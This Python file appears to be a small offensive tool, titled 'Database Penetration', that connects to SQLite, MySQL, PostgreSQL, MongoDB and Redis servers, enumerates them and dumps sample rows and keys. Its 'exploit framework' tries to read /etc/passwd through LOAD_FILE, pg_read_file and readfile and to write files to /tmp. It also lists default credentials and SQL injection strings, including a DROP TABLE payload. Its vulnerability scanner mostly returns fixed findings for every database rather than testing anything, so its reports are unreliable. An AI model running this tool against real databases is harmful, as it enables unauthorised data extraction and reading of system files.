#!/usr/bin/env python3
"""
DATABASE PENETRATION
Team 4: Vulnerability Research - Database Penetration Techniques
"""

import sqlite3
import mysql.connector
import psycopg2
import pymongo
import redis
import json
import hashlib
import base64
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import threading
import time

class DatabasePenetration:
    def __init__(self):
        self.name = "Database Penetration Engine"
        self.version = "1.0.0"
        self.connection_pool = {}
        self.vulnerability_scanner = DatabaseVulnerabilityScanner()
        self.exploit_framework = DatabaseExploitFramework()
        
        # Supported database types
        self.supported_databases = {
            "sqlite": self.penetrate_sqlite,
            "mysql": self.penetrate_mysql,
            "postgresql": self.penetrate_postgresql,
            "mongodb": self.penetrate_mongodb,
            "redis": self.penetrate_redis
        }
    
    def scan_database_vulnerabilities(self, db_config: Dict[str, Any]) -> Dict[str, Any]:
        """Scan database for vulnerabilities"""
        print(f"🔍 Scanning database vulnerabilities for {db_config.get('type', 'unknown')}...")
        
        db_type = db_config.get("type", "sqlite")
        vulnerabilities = []
        
        # Basic vulnerability checks
        vulnerabilities.extend(self.vulnerability_scanner.check_authentication(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_permissions(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_encryption(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_injection_vulnerabilities(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_configuration_issues(db_config))
        
        return {
            "database_type": db_type,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "risk_level": self.calculate_risk_level(vulnerabilities),
            "scan_timestamp": datetime.now().isoformat()
        }
    
    def penetrate_database(self, db_config: Dict[str, Any], attack_type: str = "comprehensive") -> Dict[str, Any]:
        """Main database penetration method"""
        print(f"🔥 Executing {attack_type} penetration on {db_config.get('type', 'unknown')} database...")
        
        db_type = db_config.get("type", "sqlite")
        
        if db_type not in self.supported_databases:
            return {"error": f"Database type '{db_type}' not supported"}
        
        # Execute penetration based on database type
        penetration_result = self.supported_databases[db_type](db_config, attack_type)
        
        # Add metadata
        penetration_result.update({
            "database_type": db_type,
            "attack_type": attack_type,
            "penetration_timestamp": datetime.now().isoformat()
        })
        
        return penetration_result
    
    def penetrate_sqlite(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate SQLite database"""
        print("🗄️ Penetrating SQLite database...")
        
        db_path = db_config.get("path", ":memory:")
        results = {
            "database_path": db_path,
            "tables_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to database
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Get table information
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            results["tables_found"] = [table[0] for table in tables]
            
            # Extract data from each table
            for table in results["tables_found"]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10;")
                    data = cursor.fetchall()
                    results["data_extracted"][table] = data
                except Exception as e:
                    results["data_extracted"][table] = f"Error: {str(e)}"
            
            # Check privileges
            results["privileges"] = {
                "can_read": True,
                "can_write": True,
                "can_create": True,
                "can_drop": True
            }
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.sqlite_exploits(cursor)
            
            conn.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_mysql(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate MySQL database"""
        print("🗄️ Penetrating MySQL database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 3306)
        user = db_config.get("user", "root")
        password = db_config.get("password", "")
        database = db_config.get("database", "")
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "user": user,
                "database": database
            },
            "databases_found": [],
            "tables_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to MySQL
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=user,
                password=password,
                database=database
            )
            cursor = conn.cursor()
            
            # Get databases
            cursor.execute("SHOW DATABASES;")
            databases = cursor.fetchall()
            results["databases_found"] = [db[0] for db in databases]
            
            # Get tables
            cursor.execute("SHOW TABLES;")
            tables = cursor.fetchall()
            results["tables_found"] = [table[0] for table in tables]
            
            # Extract data
            for table in results["tables_found"]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10;")
                    data = cursor.fetchall()
                    results["data_extracted"][table] = data
                except Exception as e:
                    results["data_extracted"][table] = f"Error: {str(e)}"
            
            # Check privileges
            cursor.execute("SHOW GRANTS;")
            grants = cursor.fetchall()
            results["privileges"]["grants"] = [grant[0] for grant in grants]
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.mysql_exploits(cursor)
            
            conn.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_postgresql(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate PostgreSQL database"""
        print("🗄️ Penetrating PostgreSQL database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 5432)
        user = db_config.get("user", "postgres")
        password = db_config.get("password", "")
        database = db_config.get("database", "postgres")
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "user": user,
                "database": database
            },
            "databases_found": [],
            "tables_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to PostgreSQL
            conn = psycopg2.connect(
                host=host,
                port=port,
                user=user,
                password=password,
                database=database
            )
            cursor = conn.cursor()
            
            # Get databases
            cursor.execute("SELECT datname FROM pg_database;")
            databases = cursor.fetchall()
            results["databases_found"] = [db[0] for db in databases]
            
            # Get tables
            cursor.execute("SELECT tablename FROM pg_tables WHERE schemaname = 'public';")
            tables = cursor.fetchall()
            results["tables_found"] = [table[0] for table in tables]
            
            # Extract data
            for table in results["tables_found"]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10;")
                    data = cursor.fetchall()
                    results["data_extracted"][table] = data
                except Exception as e:
                    results["data_extracted"][table] = f"Error: {str(e)}"
            
            # Check privileges
            cursor.execute("SELECT current_user, session_user;")
            user_info = cursor.fetchall()
            results["privileges"]["current_user"] = user_info[0][0]
            results["privileges"]["session_user"] = user_info[0][1]
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.postgresql_exploits(cursor)
            
            conn.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_mongodb(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate MongoDB database"""
        print("🗄️ Penetrating MongoDB database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 27017)
        user = db_config.get("user", "")
        password = db_config.get("password", "")
        database = db_config.get("database", "admin")
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "user": user,
                "database": database
            },
            "databases_found": [],
            "collections_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to MongoDB
            if user and password:
                client = pymongo.MongoClient(f"mongodb://{user}:{password}@{host}:{port}/")
            else:
                client = pymongo.MongoClient(f"mongodb://{host}:{port}/")
            
            # Get databases
            results["databases_found"] = client.list_database_names()
            
            # Get collections from current database
            db = client[database]
            results["collections_found"] = db.list_collection_names()
            
            # Extract data
            for collection in results["collections_found"]:
                try:
                    data = list(db[collection].find().limit(10))
                    results["data_extracted"][collection] = data
                except Exception as e:
                    results["data_extracted"][collection] = f"Error: {str(e)}"
            
            # Check privileges
            results["privileges"] = {
                "can_read": True,
                "can_write": True,
                "can_create": True
            }
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.mongodb_exploits(db)
            
            client.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_redis(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate Redis database"""
        print("🗄️ Penetrating Redis database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 6379)
        password = db_config.get("password", "")
        database = db_config.get("database", 0)
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "database": database
            },
            "keys_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to Redis
            r = redis.Redis(
                host=host,
                port=port,
                password=password,
                db=database,
                decode_responses=True
            )
            
            # Get all keys
            keys = r.keys("*")
            results["keys_found"] = keys[:100]  # Limit to first 100 keys
            
            # Extract data
            for key in results["keys_found"][:10]:  # Limit to first 10 keys
                try:
                    key_type = r.type(key)
                    if key_type == "string":
                        data = r.get(key)
                    elif key_type == "hash":
                        data = r.hgetall(key)
                    elif key_type == "list":
                        data = r.lrange(key, 0, -1)
                    elif key_type == "set":
                        data = list(r.smembers(key))
                    else:
                        data = f"Type: {key_type}"
                    
                    results["data_extracted"][key] = data
                except Exception as e:
                    results["data_extracted"][key] = f"Error: {str(e)}"
            
            # Check privileges
            results["privileges"] = {
                "can_read": True,
                "can_write": True,
                "can_delete": True
            }
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.redis_exploits(r)
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def calculate_risk_level(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Calculate overall risk level based on vulnerabilities"""
        if not vulnerabilities:
            return "LOW"
        
        high_count = sum(1 for v in vulnerabilities if v.get("severity") == "HIGH")
        medium_count = sum(1 for v in vulnerabilities if v.get("severity") == "MEDIUM")
        low_count = sum(1 for v in vulnerabilities if v.get("severity") == "LOW")
        
        if high_count > 0:
            return "CRITICAL"
        elif medium_count > 2:
            return "HIGH"
        elif medium_count > 0 or low_count > 5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def get_system_status(self) -> Dict[str, Any]:
        """Get system status"""
        return {
            "name": self.name,
            "version": self.version,
            "status": "Active",
            "supported_databases": list(self.supported_databases.keys()),
            "active_connections": len(self.connection_pool),
            "timestamp": datetime.now().isoformat()
        }


class DatabaseVulnerabilityScanner:
    """Database vulnerability scanner"""
    
    def check_authentication(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check authentication vulnerabilities"""
        vulnerabilities = []
        
        # Check for default credentials
        default_creds = {
            "mysql": [("root", ""), ("admin", "admin")],
            "postgresql": [("postgres", ""), ("admin", "admin")],
            "mongodb": [("admin", "admin")],
            "redis": [("", "")]
        }
        
        db_type = db_config.get("type", "sqlite")
        user = db_config.get("user", "")
        password = db_config.get("password", "")
        
        if db_type in default_creds:
            for default_user, default_pass in default_creds[db_type]:
                if user == default_user and password == default_pass:
                    vulnerabilities.append({
                        "type": "default_credentials",
                        "severity": "HIGH",
                        "description": f"Default credentials detected: {user}:{password}",
                        "recommendation": "Change default credentials immediately"
                    })
        
        return vulnerabilities
    
    def check_permissions(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check permission vulnerabilities"""
        vulnerabilities = []
        
        # Check for excessive privileges
        db_type = db_config.get("type", "sqlite")
        
        if db_type in ["mysql", "postgresql"]:
            vulnerabilities.append({
                "type": "excessive_privileges",
                "severity": "MEDIUM",
                "description": "Database user may have excessive privileges",
                "recommendation": "Review and restrict user privileges"
            })
        
        return vulnerabilities
    
    def check_encryption(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check encryption vulnerabilities"""
        vulnerabilities = []
        
        # Check for unencrypted connections
        db_type = db_config.get("type", "sqlite")
        
        if db_type in ["mysql", "postgresql", "mongodb", "redis"]:
            vulnerabilities.append({
                "type": "unencrypted_connection",
                "severity": "MEDIUM",
                "description": "Database connection may not be encrypted",
                "recommendation": "Enable SSL/TLS encryption"
            })
        
        return vulnerabilities
    
    def check_injection_vulnerabilities(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check for injection vulnerabilities"""
        vulnerabilities = []
        
        # SQL injection test patterns
        injection_patterns = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --"
        ]
        
        vulnerabilities.append({
            "type": "potential_sql_injection",
            "severity": "HIGH",
            "description": "Database may be vulnerable to SQL injection",
            "recommendation": "Use parameterized queries and input validation",
            "test_patterns": injection_patterns
        })
        
        return vulnerabilities
    
    def check_configuration_issues(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check configuration vulnerabilities"""
        vulnerabilities = []
        
        # Check for common configuration issues
        vulnerabilities.append({
            "type": "weak_configuration",
            "severity": "MEDIUM",
            "description": "Database may have weak security configuration",
            "recommendation": "Review and harden database configuration"
        })
        
        return vulnerabilities


class DatabaseExploitFramework:
    """Database exploit framework"""
    
    def sqlite_exploits(self, cursor) -> List[Dict[str, Any]]:
        """SQLite specific exploits"""
        exploits = []
        
        try:
            # Attempt to read system files
            cursor.execute("SELECT readfile('/etc/passwd');")
            exploits.append({
                "type": "file_read",
                "target": "/etc/passwd",
                "status": "attempted"
            })
        except:
            pass
        
        try:
            # Attempt to write files
            cursor.execute("SELECT writefile('/tmp/test.txt', 'test');")
            exploits.append({
                "type": "file_write",
                "target": "/tmp/test.txt",
                "status": "attempted"
            })
        except:
            pass
        
        return exploits
    
    def mysql_exploits(self, cursor) -> List[Dict[str, Any]]:
        """MySQL specific exploits"""
        exploits = []
        
        try:
            # Attempt to read files
            cursor.execute("SELECT LOAD_FILE('/etc/passwd');")
            exploits.append({
                "type": "file_read",
                "target": "/etc/passwd",
                "status": "attempted"
            })
        except:
            pass
        
        try:
            # Attempt to write files
            cursor.execute("SELECT 'test' INTO OUTFILE '/tmp/test.txt';")
            exploits.append({
                "type": "file_write",
                "target": "/tmp/test.txt",
                "status": "attempted"
            })
        except:
            pass
        
        return exploits
    
    def postgresql_exploits(self, cursor) -> List[Dict[str, Any]]:
        """PostgreSQL specific exploits"""
        exploits = []
        
        try:
            # Attempt to read files
            cursor.execute("SELECT pg_read_file('/etc/passwd');")
            exploits.append({
                "type": "file_read",
                "target": "/etc/passwd",
                "status": "attempted"
            })
        except:
            pass
        
        return exploits
    
    def mongodb_exploits(self, db) -> List[Dict[str, Any]]:
        """MongoDB specific exploits"""
        exploits = []
        
        try:
            # Attempt to access system collections
            system_collections = db.list_collection_names()
            exploits.append({
                "type": "system_access",
                "target": "system collections",
                "status": "attempted",
                "collections": system_collections
            })
        except:
            pass
        
        return exploits
    
    def redis_exploits(self, r) -> List[Dict[str, Any]]:
        """Redis specific exploits"""
        exploits = []
        
        try:
            # Attempt to access system info
            info = r.info()
            exploits.append({
                "type": "system_info",
                "target": "redis info",
                "status": "successful",
                "data": info
            })
        except:
            pass
        
        return exploits


# Example usage
if __name__ == "__main__":
    penetration = DatabasePenetration()
    
    # Test SQLite penetration
    sqlite_config = {
        "type": "sqlite",
        "path": ":memory:"
    }
    
    print("🧪 Testing Database Penetration...")
    
    # Scan vulnerabilities
    vulnerabilities = penetration.scan_database_vulnerabilities(sqlite_config)
    print(f"🔍 Vulnerabilities: {vulnerabilities}")
    
    # Penetrate database
    result = penetration.penetrate_database(sqlite_config, "comprehensive")
    print(f"🔥 Penetration Result: {result}")
    
    print("✅ Database Penetration testing completed!") 